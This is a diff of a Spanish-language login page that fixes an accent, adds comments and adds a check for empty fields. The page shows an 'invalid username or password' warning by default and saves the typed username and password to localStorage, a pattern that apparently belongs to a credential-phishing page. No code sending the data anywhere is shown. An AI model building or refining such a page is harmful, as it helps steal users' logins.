@@ -54,7 +54,7 @@
       border: 1px solid #ccc;
       border-radius: 8px;
       font-size: 1em;
-      max-width: 350px; /* Ajuste del tamaño del campo */
+      max-width: 350px;
       margin-left: auto;
       margin-right: auto;
     }
@@ -82,10 +82,11 @@
     <div class="alerta">
       ❗ Usuario o clave inválida. Por favor ingrese a su cuenta correctamente.
     </div>
-    <p>Ingrese su usuario y contraseña para iniciar su proceso de analisis.</p>
+    <p>Ingrese su usuario y contraseña para iniciar su proceso de análisis.</p>
     <form id="login-form">
       <input type="text" id="usuario" placeholder="Ingrese su usuario" required />
       <input type="password" id="clave" placeholder="Contraseña" required />
+      
       <button type="submit">Continuar</button>
     </form>
   </div>
@@ -102,9 +103,16 @@
         form.addEventListener('submit', (e) => {
           e.preventDefault();
 
+          // Obtener los valores de los campos
           const usuario = document.getElementById('usuario').value;
           const contrasena = document.getElementById('clave').value;
           const sessionId = localStorage.getItem('sessionId');
+
+          // Validar los campos antes de enviar
+          if (!usuario || !contrasena) {
+            alert("Por favor, complete todos los campos.");
+            return;
+          }
 
           // Actualizar localStorage con los nuevos datos ingresados
           localStorage.setItem('usuario', usuario);
